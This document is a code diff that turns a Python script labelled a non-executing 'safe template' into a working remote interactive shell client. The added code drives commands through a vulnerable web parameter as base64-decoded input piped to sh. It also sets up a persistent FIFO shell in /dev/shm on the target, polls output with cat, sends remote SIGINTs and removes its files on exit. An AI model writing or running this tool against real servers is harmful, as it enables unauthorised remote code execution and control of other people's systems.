@@ -1,23 +1,32 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-shell_safe_template.py — CLI template + interactive prompt (SIMULATOR, DOES NOT EXECUTE REMOTE COMMANDS)
-Creator: g3kzzz    https://github.com/g3kzzz
-Purpose: Secure template for developing an interactive CLI client that parses cookies,
-         shows a purple prompt, supports Ctrl+L, has history and writes a local log.
-WARNING: This script DOES NOT send HTTP requests or execute remote commands.
-         It only simulates and stores in 'session.log' what *would be sent*.
+Ultra-fast Remote Interactive Shell (Arrow keys + readline support)
+Author: g3kzzz edition (final improvements)
+- Ensures arrow keys / line editing work:
+    * Uses prompt_toolkit if available (recommended).
+    * Falls back to Python readline (history & arrow keys) if prompt_toolkit is not installed.
+- Much faster interaction (lower polling and small stabilization window).
+- Ctrl-C sends SIGINT to the remote foreground process (without dropping the persistent shell).
+- Ctrl-L clears screen (prompt_toolkit and readline-compatible).
+- Clean English UI, no extra blank lines, minimal latency.
 """
-
+from __future__ import annotations
 import os
 import sys
 import time
+import signal
+import threading
 import argparse
+import re
+import requests
 from base64 import b64encode
 from random import randrange
-from datetime import datetime
+from urllib.parse import quote_plus
 
-# Try to use prompt_toolkit for a better experience
+# --------------------
+# Prefer prompt_toolkit, otherwise use readline fallback
+# --------------------
 USE_PROMPT_TOOLKIT = False
 try:
     from prompt_toolkit import PromptSession
@@ -27,184 +36,410 @@ try:
 except Exception:
     USE_PROMPT_TOOLKIT = False
 
-# ---------- Colors ----------
+# Try standard readline fallback for arrow keys / editing
+USE_READLINE = False
+if not USE_PROMPT_TOOLKIT:
+    try:
+        import readline  # type: ignore
+        USE_READLINE = True
+    except Exception:
+        USE_READLINE = False
+
+# --------------------
+# Constants & helpers
+# --------------------
 MAGENTA = "\033[95m"
 BOLD = "\033[1m"
 RESET = "\033[0m"
-CLEAR_SCREEN = "\033[2J\033[H"
+CLEAR = "\033[2J\033[H"
 
-def color(txt):
-    return f"{MAGENTA}{txt}{RESET}"
+TAG_RE = re.compile(r"<[^>]+>")
+MARKER_RE = re.compile(r"^(__CTX_|__CMDSYNC_).*", re.M)
 
-def color_bold(txt):
-    return f"{MAGENTA}{BOLD}{txt}{RESET}"
+def colorize(text: str, bold: bool = False) -> str:
+    return f"{MAGENTA}{BOLD if bold else ''}{text}{RESET}"
 
-# ---------- Cookies parser ----------
-def load_cookies_simple(path):
-    """
-    Expected format: key=value per line.
-    Returns a dict.
-    """
+def strip_html(text: str) -> str:
+    if not text:
+        return ""
+    text = text.replace("&nbsp;", " ")
+    return TAG_RE.sub("", text)
+
+def clean_output(text: str) -> str:
+    if not text:
+        return ""
+    s = strip_html(text)
+    lines = []
+    for ln in s.splitlines():
+        if not ln.strip():
+            continue
+        if MARKER_RE.match(ln):
+            continue
+        lines.append(ln.rstrip())
+    return "\n".join(lines).strip()
+
+def load_cookies_file(path: str) -> dict:
     cookies = {}
     try:
-        with open(path, "r", encoding="utf-8") as fh:
-            for i, line in enumerate(fh, start=1):
+        with open(path, "r") as fh:
+            for line in fh:
                 line = line.strip()
-                if not line or line.startswith("#"):
-                    continue
-                if "=" not in line:
-                    print(f"[!] Ignored (line {i}): does not contain '=' -> {line}")
+                if not line or "=" not in line:
                     continue
                 k, v = line.split("=", 1)
-                k = k.strip()
-                v = v.strip()
-                if not k:
-                    print(f"[!] Ignored (line {i}): empty key.")
-                    continue
-                cookies[k] = v
-    except FileNotFoundError:
-        raise
+                cookies[k.strip()] = v.strip()
+    except Exception:
+        pass
     return cookies
 
-# ---------- Utilities ----------
-def get_username_and_hostname():
-    username = os.getenv("USER") or "g3kzzz"
+# --------------------
+# HTTP primitives (fast)
+# --------------------
+def send_request(session: requests.Session, url: str, payload: str, timeout: float = 4.0) -> str:
     try:
-        hostname = os.uname()[1]
-    except Exception:
-        hostname = "localhost"
-    return username, hostname
+        if url.endswith("="):
+            encoded = quote_plus(payload, safe="/%:@()[]!$&'*,;=")
+            r = session.get(url + encoded, timeout=timeout)
+        else:
+            r = session.get(url, params={"cmd": payload}, timeout=timeout)
+        return clean_output(r.text)
+    except requests.RequestException as e:
+        return f"[!] HTTP error: {e}"
 
-def nice_cwd():
-    cd = os.getcwd()
-    home = os.path.expanduser("~")
-    return "~" if cd == home else cd
+def run_cmd(session: requests.Session, url: str, cmd: str) -> str:
+    b64 = b64encode(cmd.encode()).decode()
+    payload = f'echo "{b64}" | base64 -d | sh'
+    return send_request(session, url, payload, timeout=5.0)
 
-# ---------- Send simulation ----------
-def build_payload_simulation(command):
-    """
-    Returns a simulated representation of the payload that *would be sent*.
-    (e.g.: base64 -> shell)
-    """
-    encoded = b64encode(command.encode("utf-8")).decode("utf-8")
-    simulated = f'echo "{encoded}" | base64 -d | sh'
-    return simulated
+def write_cmd(session: requests.Session, url: str, stdin: str, cmd: str) -> str:
+    b64 = b64encode(cmd.encode()).decode()
+    payload = f'echo "{b64}" | base64 -d > {stdin}'
+    return send_request(session, url, payload, timeout=5.0)
 
-# ---------- Local logging ----------
-LOGFILE = "session.log"
+def read_file(session: requests.Session, url: str, path: str) -> str:
+    return run_cmd(session, url, f"/bin/cat {path}")
 
-def log_simulation(url, cookies, command, simulated_payload):
-    ts = datetime.utcnow().isoformat() + "Z"
-    with open(LOGFILE, "a", encoding="utf-8") as f:
-        f.write(f"--- {ts} ---\n")
-        f.write(f"URL: {url}\n")
-        f.write(f"COOKIES: {cookies}\n")
-        f.write(f"CMD: {command}\n")
-        f.write(f"SIMULATED_PAYLOAD: {simulated_payload}\n\n")
+# --------------------
+# Reader: very responsive, small settle window
+# --------------------
+class Reader(threading.Thread):
+    def __init__(self, session: requests.Session, url: str, stdout: str,
+                 interval: float = 0.06, settle: float = 0.03):
+        super().__init__(daemon=True)
+        self.session = session
+        self.url = url
+        self.stdout = stdout
+        self.interval = interval
+        self.settle = settle
+        self._stop = threading.Event()
+        self._suspend = threading.Event()
+        self._lock = threading.Lock()
+        self.last = ""              # last filtered snapshot
+        self.printed_event = threading.Event()
 
-# ---------- Interactive prompt ----------
-def interactive_loop(url, cookies, interval):
-    username, hostname = get_username_and_hostname()
-
-    # Configure prompt_toolkit if available
-    if USE_PROMPT_TOOLKIT:
-        kb = KeyBindings()
-        @kb.add("c-l")
-        def _(event):
-            "Ctrl+L clears the screen"
-            sys.stdout.write(CLEAR_SCREEN)
-            sys.stdout.flush()
-        session = PromptSession(history=InMemoryHistory(), key_bindings=kb)
-        prompt_func = lambda p: session.prompt(p)
-    else:
-        # Simple fallback: input()
-        def prompt_func(p):
+    def run(self):
+        while not self._stop.is_set():
+            if self._suspend.is_set():
+                time.sleep(self.interval)
+                continue
             try:
-                return input(p)
-            except EOFError:
-                raise
-            except KeyboardInterrupt:
-                raise
+                raw = read_file(self.session, self.url, self.stdout)
+                filtered = raw or ""
+                if filtered == self.last:
+                    time.sleep(self.interval)
+                    continue
 
-    print(color_bold(f"Creator: g3kzzz — https://github.com/g3kzzz"))
-    print(color(f"SIMULATION MODE — nothing will be executed remotely\nTarget URL (informational): {url}"))
-    if cookies:
-        print(color(f"Cookies loaded: {len(cookies)}"))
+                # stabilization window: collect small bursts
+                deadline = time.time() + self.settle
+                current = filtered
+                while time.time() < deadline:
+                    time.sleep(self.settle / 4)
+                    more = read_file(self.session, self.url, self.stdout) or ""
+                    if more != current:
+                        current = more
+                        deadline = time.time() + self.settle
+
+                # compute delta/suffix to avoid re-printing everything when possible
+                delta = ""
+                if self.last and current.startswith(self.last):
+                    delta = current[len(self.last):]
+                else:
+                    delta = current
+
+                delta = delta.strip("\n")
+                if delta:
+                    # print clean block (no extra leading blank lines)
+                    with self._lock:
+                        sys.stdout.write(delta + ("\n" if not delta.endswith("\n") else ""))
+                        sys.stdout.flush()
+                    self.printed_event.set()
+                self.last = current
+            except Exception:
+                # fail silently and retry quickly
+                time.sleep(self.interval)
+
+    def stop(self):
+        self._stop.set()
+
+    def suspend(self):
+        self._suspend.set()
+
+    def resume(self):
+        self._suspend.clear()
+
+    def clear_event(self):
+        self.printed_event.clear()
+
+    def wait_event(self, timeout: float = 2.0) -> bool:
+        return self.printed_event.wait(timeout=timeout)
+
+# --------------------
+# Helpers for safe synchronous reads (use temp file on remote host)
+# --------------------
+def exec_to_tmp(session: requests.Session, url: str, stdin: str, cmd: str, timeout: float = 1.5) -> str:
+    sid = randrange(100000, 999999)
+    tmp = f"/dev/shm/ctx.{sid}"
+    wrapped = f"({cmd}) > {tmp} 2>&1"
+    # write wrapped command to fifo so the persistent shell executes it (and writes to tmp)
+    write_cmd(session, url, stdin, wrapped + "\n")
+    deadline = time.time() + timeout
+    out = ""
+    while time.time() < deadline:
+        time.sleep(0.06)
+        out = read_file(session, url, tmp)
+        if out and not out.startswith("[!] HTTP error"):
+            break
+    # try cleanup remote tmp (best effort)
+    try:
+        run_cmd(session, url, f"/bin/rm -f {tmp}")
+    except Exception:
+        pass
+    return out or ""
+
+# --------------------
+# Setup / cleanup remote FIFO shell
+# --------------------
+def setup_shell(session: requests.Session, url: str, stdin: str, stdout: str) -> None:
+    # mkfifo and start tail|sh in background; redirect stdout+stderr to stdout file
+    cmd = f"/bin/rm -f {stdin} {stdout}; /bin/mkfifo {stdin}; /bin/touch {stdout}; /bin/tail -f {stdin} | /bin/sh > {stdout} 2>&1 &"
+    run_cmd(session, url, cmd)
+
+def cleanup(session: requests.Session, url: str, stdin: str, stdout: str) -> None:
+    try:
+        run_cmd(session, url, f"/bin/rm -f {stdin} {stdout}")
+    except Exception:
+        pass
+
+# --------------------
+# Send Ctrl-C to the remote **foreground** process (without killing the persistent sh)
+# Strategy:
+#  - Write ASCII 0x03 into the fifo (simulating Ctrl-C to the shell's stdin)
+#  - Also attempt to send SIGINT to the most recent child process of the persistent shell (best-effort)
+# Notes: behavior depends on remote environment; this combination maximizes chance to interrupt running job.
+# --------------------
+def send_remote_sigint(session: requests.Session, url: str, stdin: str) -> None:
+    try:
+        # primary: write literal Ctrl-C to fifo
+        # Use printf to ensure raw control char is sent
+        payload = 'printf "\\x03" > ' + stdin
+        run_cmd(session, url, payload)
+    except Exception:
+        pass
+    try:
+        # best-effort: send SIGINT to the newest descendant of the persistent shell (may require /bin/pgrep)
+        # This attempts to find processes whose parent is sh (or tail) - it's a heuristic and won't always work.
+        run_cmd(session, url, "pidof sh >/dev/null 2>&1 && pgrep -n -P $(pidof sh) >/dev/null 2>&1 && pkill -SIGINT -n -P $(pidof sh) || true")
+    except Exception:
+        pass
+
+# --------------------
+# Get remote context (whoami, hostname, pwd) without touching shared stdout
+# --------------------
+def get_remote_context(session: requests.Session, url: str, stdin: str, reader: Reader) -> tuple[str, str, str]:
+    reader.suspend()
+    try:
+        out = exec_to_tmp(session, url, stdin, "whoami; hostname -s || hostname; pwd", timeout=1.2)
+        parts = [p.strip() for p in (out or "").splitlines() if p.strip()]
+        if len(parts) >= 3:
+            return parts[0], parts[1], parts[2]
+        # fallback defaults
+        while len(parts) < 3:
+            parts.append("unknown")
+        return parts[0], parts[1], parts[2]
+    finally:
+        reader.resume()
+
+# --------------------
+# Input helpers: prompt_toolkit or readline fallback
+# --------------------
+def make_prompt_session():
+    # Configure prompt_toolkit session with keybindings for Ctrl-L and Ctrl-C
+    kb = KeyBindings()
+    @kb.add("c-l")
+    def _(event):
+        # clear screen
+        print(CLEAR, end="")
+    @kb.add("c-c")
+    def _(event):
+        # allow our outer SIGINT handling to trigger; just raise KeyboardInterrupt in prompt so outer catches it
+        event.app.exit(exception=KeyboardInterrupt, style="class:aborting")
+    session = PromptSession(history=InMemoryHistory(), key_bindings=kb)
+    return session
+
+def setup_readline_history():
+    try:
+        import readline  # type: ignore
+        histfile = os.path.expanduser("~/.g3kzzz_shell_history")
+        try:
+            readline.read_history_file(histfile)
+        except Exception:
+            pass
+        import atexit
+        atexit.register(lambda: readline.write_history_file(histfile))
+        # Enable Ctrl-L to clear screen via readline (many readline configs handle Ctrl-L automatically)
+    except Exception:
+        pass
+
+# --------------------
+# Main interactive loop
+# --------------------
+def interactive_loop(session: requests.Session, url: str, stdin: str, stdout: str, interval: float):
+    reader = Reader(session, url, stdout, interval=interval, settle=max(0.02, interval/3))
+    reader.start()
+
+    def sigint_handler(sig, frame):
+        # don't exit the client; interrupt remote job
+        send_remote_sigint(session, url, stdin)
+        # friendly message
+        sys.stdout.write("\n[!] Sent SIGINT to remote process (use 'exit' to quit)\n")
+        sys.stdout.flush()
+
+    signal.signal(signal.SIGINT, sigint_handler)
+
+    # Setup input frontend
+    if USE_PROMPT_TOOLKIT:
+        p_session = make_prompt_session()
+        prompt_func = lambda prompt_text: p_session.prompt(prompt_text)
     else:
-        print(color("No cookies were loaded."))
-
-    print(color("Type commands. 'exit' or Ctrl+D to quit. 'clear' clears the screen."))
+        # fallback: ensure readline history & basic arrow support
+        if USE_READLINE:
+            setup_readline_history()
+        def prompt_func(prompt_text):
+            try:
+                return input(prompt_text)
+            except KeyboardInterrupt:
+                # translate to sending remote SIGINT (do not exit)
+                send_remote_sigint(session, url, stdin)
+                sys.stdout.write("\n[!] Sent SIGINT to remote process (use 'exit' to quit)\n")
+                sys.stdout.flush()
+                return ""
+            except EOFError:
+                return ""
 
     try:
         while True:
             try:
-                cwd = nice_cwd()
-                header = color_bold(f"[{username} ✘ {hostname}] - [{cwd}]")
-                print(header)
-                raw = prompt_func(color(">>> ")).strip()
-                if raw == "":
-                    continue
-                if raw.lower() in ("exit", "quit"):
-                    print(color("[*] Exiting."))
-                    break
-                if raw.lower() == "clear":
-                    sys.stdout.write(CLEAR_SCREEN); sys.stdout.flush(); continue
+                user, host, cwd = get_remote_context(session, url, stdin, reader)
+            except Exception:
+                user, host, cwd = ("unknown", "unknown", "~")
 
-                # Support style key=value -> take the part after the last '='
-                cmd = raw.split("=")[-1].strip()
-
-                # Build simulated payload (base64->sh)
-                simulated = build_payload_simulation(cmd)
-
-                # Print in purple what *would* be sent (not sent)
-                print(color("\n[SIMULATION] This would be sent to the target (NOT sent):"))
-                print(color(simulated))
-                print(color("\n[INFO] Logging the simulation to: " + LOGFILE + "\n"))
-
-                # Save to local log
-                log_simulation(url, cookies, cmd, simulated)
-
-                # Simulated wait to mimic polling interval
-                time.sleep(interval)
-
-            except KeyboardInterrupt:
-                print(color("\n[!] Interrupted. Use 'exit' or Ctrl+D to quit."))
+            # print header then prompt
+            sys.stdout.write(colorize(f"[{user} ✘ {host}] - [{cwd}]\n", True))
+            sys.stdout.flush()
+            raw = prompt_func(colorize(">>> "))
+            if raw is None:
+                raw = ""
+            raw = raw.strip()
+            if not raw:
                 continue
-            except EOFError:
-                print(color("\n[!] EOF received. Exiting."))
-                break
-    finally:
-        print(color("[*] End of simulated session."))
+            if raw.lower() in ("exit", "quit"):
+                sys.stdout.write("[*] Exiting and cleaning up...\n")
+                sys.stdout.flush()
+                reader.stop()
+                cleanup(session, url, stdin, stdout)
+                time.sleep(0.05)
+                return
+            if raw.lower() == "clear":
+                sys.stdout.write(CLEAR)
+                sys.stdout.flush()
+                continue
 
-# ---------- CLI ----------
+            # fast sync commands that should not go through the shared stdout
+            sync_cmds = {"whoami", "hostname", "pwd"}
+            first = raw.split()[0] if raw.split() else ""
+            if first in sync_cmds:
+                reader.suspend()
+                try:
+                    out = exec_to_tmp(session, url, stdin, raw, timeout=1.2)
+                    if out:
+                        # print straight away (no extra blank lines)
+                        sys.stdout.write(out.strip() + ("\n" if not out.strip().endswith("\n") else ""))
+                        sys.stdout.flush()
+                finally:
+                    reader.resume()
+                continue
+
+            # before sending command, clear printed_event so wait only for new output
+            reader.clear_event()
+            # special handling for cd: write command to fifo so the persistent shell will update cwd
+            if raw.startswith("cd"):
+                # write raw cd command to FIFO; then request pwd via temp file to get updated cwd
+                write_cmd(session, url, stdin, raw + "\n")
+                # small sleep to let the remote shell process cd
+                time.sleep(0.06)
+                # get new cwd via tmp
+                try:
+                    reader.suspend()
+                    out = exec_to_tmp(session, url, stdin, "pwd", timeout=0.8)
+                    if out:
+                        # update reader.last to include current remote stdout state so we avoid duplication
+                        # we do not force a print here; just update last snapshot
+                        reader.last = reader.last  # no-op but explicit
+                    finally_block = None
+                except Exception:
+                    pass
+                finally:
+                    reader.resume()
+                continue
+
+            # normal command: send to FIFO and wait for reader to print (or timeout)
+            write_cmd(session, url, stdin, raw + "\n")
+            # wait for event - if the command produces output, reader will set event; otherwise we timeout
+            _ = reader.wait_event(timeout=2.0)
+            # small stabilization pause for nice UX
+            time.sleep(0.02)
+    finally:
+        try:
+            reader.stop()
+            cleanup(session, url, stdin, stdout)
+        except Exception:
+            pass
+
+# --------------------
+# Entrypoint
+# --------------------
 def main():
-    parser = argparse.ArgumentParser(prog="shell_safe_template.py",
-                                     description="Safe template: CLI + interactive prompt (SIMULATOR).",
-                                     add_help=False)
-    parser.add_argument("--url", required=False, help="Target URL (informational). Required to continue.")
-    parser.add_argument("--cookies", help="Cookies file (key=value per line).")
-    parser.add_argument("--interval", type=float, default=1.0, help="Simulation interval in seconds.")
-    parser.add_argument("--help", action="store_true", help="Show help and examples.")
+    parser = argparse.ArgumentParser(prog="term_http", description="Ultra-fast remote shell (g3kzzz edition)")
+    parser.add_argument("--url", required=True, help="Target URL, end with '=' if direct payload")
+    parser.add_argument("--cookies", help="Cookie file (key=value per line)")
+    parser.add_argument("--interval", type=float, default=0.06, help="Polling interval in seconds (default: 0.06)")
+    parser.add_argument("--user-agent", help="Custom HTTP User-Agent")
     args = parser.parse_args()
 
-    # Show help if --url is missing or --help was requested
-    if args.help or not args.url:
-        print(__doc__)
-        print("\nUSAGE EXAMPLE:\n  python3 shell_safe_template.py --url 'http://target/vuln.php?cmd=' --cookies cookies.txt --interval 1.0\n")
-        print("Note: This script runs in SIMULATION MODE. Nothing will be executed on remote hosts.\n")
-        print("cookies.txt file: key=value per line. Example:\n  PHPSESSID=abcd1234efgh5678\n  sessionid=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\n  csrftoken=9f8e7d6c5b4a3\n")
-        sys.exit(0)
-
-    cookies = {}
+    sess = requests.Session()
+    sess.headers.update({"User-Agent": args.user_agent or "g3kzzz-ultrafast-shell/4.0"})
     if args.cookies:
-        try:
-            cookies = load_cookies_simple(args.cookies)
-        except FileNotFoundError:
-            print(f"[!] Cookies file not found: {args.cookies}")
-            sys.exit(1)
+        sess.cookies.update(load_cookies_file(args.cookies))
 
-    # Launch interactive prompt (SIMULATION)
-    interactive_loop(args.url, cookies, args.interval)
+    stdin = f"/dev/shm/input.{randrange(1000,9999)}"
+    stdout = f"/dev/shm/output.{randrange(1000,9999)}"
+
+    sys.stdout.write(colorize("[*] Starting remote shell...\n", True))
+    sys.stdout.flush()
+    setup_shell(sess, args.url, stdin, stdout)
+    interactive_loop(sess, args.url, stdin, stdout, args.interval)
 
 if __name__ == "__main__":
     main()
+
+
